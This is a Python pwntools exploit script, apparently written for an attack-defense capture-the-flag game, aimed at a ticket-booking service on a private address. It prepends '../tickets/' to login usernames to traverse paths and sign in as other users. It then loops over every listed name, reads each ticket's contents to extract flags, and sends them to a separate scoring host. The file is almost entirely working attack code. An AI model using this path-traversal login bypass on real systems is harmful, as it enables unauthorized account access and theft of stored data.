from pwn import *

if(len(sys.argv)>1):
    r=remote("10.0.0.1",7478)


reu = lambda a : r.recvuntil(a)
sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
rel = lambda : r.recvline()
sa = lambda a,b : r.sendafter(a,b)
re = lambda a : r.recv(a)

def cont1():
    reu("exit\n================\n")

def cont2():
    reu("logout\n================\n")

def login(inp,p):
    cont1()
    sl("1")
    s = "../tickets/"+inp
    sla("username:\n",s)
    sla("password:\n",p)

def view():
    cont1()
    sl("4")
    return reu("\n\n")

def anonymous(name,p):
    cont1()
    sl("5")
    sla("airport\n",name)
    sla("airport\n",p)
    sla("ticket\n",p)
    reu("is:\n")
    return rel()

def viewtickets():
    cont2()
    sl("2")
    rel()
    return rel()

def getflag(inp):
    cont2()
    sl("3")
    sla("ticket\n",inp)
    reu("content:\n")
    return rel()

def quit():
    cont2()
    sl("4")

if __name__ == "__main__":
    names=view().split(b"\n")
    password="pass"
    for i in range(1,len(names)):
        name=names[i].decode()
        ticket=anonymous(name,password)
        ticket=ticket.replace(b"/n",b"")
        ticket=ticket.decode()
        login(ticket,password)
        values=viewtickets().split(b" ")
        for value in values:
            if value != b"1":
                flag=getflag(value).decode()
                if "🏳️‍🌈" in flag:
                    print(flag)
                    r.close()
                    io = remote("10.0.13.37",1337)
                    io.sendline(flag)
                    io.interactive()
        quit()

